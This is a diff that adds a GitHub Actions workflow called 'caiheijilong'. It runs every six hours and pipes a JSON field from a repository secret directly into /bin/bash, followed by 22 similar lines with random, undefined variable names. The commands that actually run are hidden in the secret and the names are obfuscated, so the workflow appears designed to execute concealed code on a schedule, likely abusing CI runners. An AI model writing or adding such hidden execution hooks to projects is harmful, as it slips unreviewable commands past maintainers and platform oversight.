@@ -1,0 +1,39 @@
+name: caiheijilong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caiheijilong
+        env:
+          kgi72366: ${{ secrets.kgi72366 }}
+        run: |
+          echo $kgi72366 | jq -r .rw20989 | /bin/bash
+          echo $ol662 | jq -r .cmw7651 | /bin/bash
+          echo $ad656 | jq -r .rrz486 | /bin/bash
+          echo $vkhr23 | jq -r .xkv89763 | /bin/bash
+          echo $hztf7 | jq -r .dfua2946 | /bin/bash
+          echo $h24280 | jq -r .hfr455 | /bin/bash
+          echo $qwdq29 | jq -r .qynf26 | /bin/bash
+          echo $zcsed37 | jq -r .hgun256 | /bin/bash
+          echo $rqp12199 | jq -r .ojzf0865 | /bin/bash
+          echo $esbv39677 | jq -r .cnszd4437 | /bin/bash
+          echo $a7016 | jq -r .bjn53 | /bin/bash
+          echo $anzsy207 | jq -r .xi682 | /bin/bash
+          echo $ppvlr1 | jq -r .gih72941 | /bin/bash
+          echo $aj57957 | jq -r .okiwn2 | /bin/bash
+          echo $upmly40086 | jq -r .i766 | /bin/bash
+          echo $x008 | jq -r .adw850 | /bin/bash
+          echo $wvwqu3985 | jq -r .xcmfa4124 | /bin/bash
+          echo $tm9629 | jq -r .kfu904 | /bin/bash
+          echo $ezbv6090 | jq -r .tgdx575 | /bin/bash
+          echo $cio565 | jq -r .j9 | /bin/bash
+          echo $qafbj0 | jq -r .cuj12921 | /bin/bash
+          echo $xdwy430 | jq -r .c1 | /bin/bash
+          echo $rsy4333 | jq -r .zjop60091 | /bin/bash
+
